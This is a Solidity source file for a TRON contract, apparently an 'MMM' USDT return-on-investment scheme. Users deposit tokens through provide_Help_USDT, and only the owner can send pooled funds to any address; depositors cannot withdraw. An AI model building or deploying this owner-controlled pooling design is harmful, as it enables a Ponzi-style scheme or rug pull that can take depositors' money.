//SourceUnit: TRX_USDT_ROI_1.sol

pragma solidity ^0.5.0;


/**
 * @dev Wrappers over Solidity's arithmetic operations with added overflow
 * checks.
 *
 * Arithmetic operations in Solidity wrap on overflow. This can easily result
 * in bugs, because programmers usually assume that an overflow raises an
 * error, which is the standard behavior in high level programming languages.
 * `SafeMath` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts with custom message when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract owned {
    address public owner;

    constructor () public {
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == owner, "You ara not owner");
        _;
    }

    function transferOwnership(address newOwner) onlyOwner public returns (bool) {
        owner = newOwner;
        return true;
    }
}

contract MMM_TRON_USDT is owned{
    using SafeMath for uint;

    IERC20 public USDT;

    struct UserStruct {
        bool isExist;
        uint investment_USDT;
        uint withdrawal_USDT;
    }

    bool isInit = false;

    mapping (address => UserStruct) public userInfo;

    uint public noOfInvestedUsers = 0;

    event investEvent(address indexed _user, uint _amount, uint _time);
    event withdrawalEvent(address indexed _user, uint _amount, uint _time);
    event rewardEvent(address indexed _user,address indexed _referrer, uint _amount, uint _time);
    
     function init(address _USDT) onlyOwner public returns (bool) {
        require(!isInit, "Initialized");
        USDT = IERC20(_USDT);
        isInit = true;
        return true;
    }
        
    function balance_USDT() view public returns (uint) {
        return USDT.balanceOf(address(this));
    }

    function provide_Help_USDT(uint _amount) public returns (bool) {
        require (USDT.balanceOf(msg.sender) >= _amount, "You don't have enough tokens");

        USDT.transferFrom(msg.sender, address(this), _amount);

        if(!userInfo[msg.sender].isExist){
            UserStruct memory userStruct;
            noOfInvestedUsers++;

            userStruct = UserStruct({
                isExist: true,
                investment_USDT: _amount,
                withdrawal_USDT: 0
            });

            userInfo[msg.sender] = userStruct;
        }else{
            userInfo[msg.sender].investment_USDT += _amount;
        }

        emit investEvent(msg.sender, _amount, now);
        return true;
    }

    function withdrawal_USDT(address  _toAddress, uint _amount) onlyOwner public returns (bool) {
        require(_amount <= USDT.balanceOf(address(this)), "Insufficient funds");
        
        if(!userInfo[_toAddress].isExist){
            UserStruct memory userStruct;
            noOfInvestedUsers++;

            userStruct = UserStruct({
                isExist: true,
                investment_USDT: 0,
                withdrawal_USDT: _amount
            });

            userInfo[_toAddress] = userStruct;
        }else{
            userInfo[_toAddress].withdrawal_USDT += _amount;
        }

        USDT.transfer(_toAddress, _amount);
        return true;
    }
}